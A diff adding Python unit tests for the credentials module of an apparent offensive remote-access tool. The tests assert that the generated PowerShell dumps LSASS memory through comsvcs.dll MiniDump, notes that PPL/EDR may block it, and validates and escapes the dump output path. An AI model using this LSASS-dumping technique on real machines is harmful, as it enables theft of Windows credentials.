@@ -49,6 +49,42 @@ class TestCredsModule(unittest.TestCase):
                 self.assertEqual(result["status"], "error")
                 shell.run_with_interrupt.assert_not_called()
 
+    def test_lsa_dump_stages_unique_minidump_and_reports_hash(self):
+        shell = shell_mock()
+        result = CredsModule().run(shell, ["--lsa"])
+        script = script_from(shell)
+        self.assertEqual(result["selected"], ["--lsa"])
+        self.assertIn("$doLsa = $true", script)
+        self.assertIn("pwnrm_lsass_{0}.dmp", script)
+        self.assertIn("comsvcs.dll", script)
+        self.assertIn("Get-FileHash -LiteralPath $dumpPath -Algorithm SHA256", script)
+        self.assertIn("PPL/EDR may block access", script)
+        self.assertIn("$ErrorActionPreference = 'Stop'", script)
+        self.assertIn("-ErrorAction Continue", script)
+        self.assertIn("& $rundll32 $comsvcsEntry MiniDump", script)
+        self.assertIn("MiniDump worker timed out after 180 seconds", script)
+        self.assertNotIn("Start-Process -FilePath $rundll32", script)
+
+    def test_lsa_output_requires_lsa_and_absolute_safe_path(self):
+        for args in (
+            ["--lsa-output"],
+            ["--lsa-output", "relative.dmp"],
+            ["--lsa-output", "C:\\Temp\\*.dmp", "--lsa"],
+            ["--lsa-output", "C:\\Temp\\dump.dmp"],
+        ):
+            with self.subTest(args=args):
+                shell = shell_mock()
+                result = CredsModule().run(shell, args)
+                self.assertEqual(result["status"], "error")
+                shell.run_with_interrupt.assert_not_called()
+
+    def test_lsa_output_is_single_quote_escaped(self):
+        shell = shell_mock()
+        result = CredsModule().run(shell, ["--lsa", "--lsa-output", "C:\\Temp\\operator's.dmp"])
+        script = script_from(shell)
+        self.assertEqual(result["status"], "completed")
+        self.assertIn("$lsaOutput = 'C:\\Temp\\operator''s.dmp'", script)
+
 
 if __name__ == "__main__":
     unittest.main()
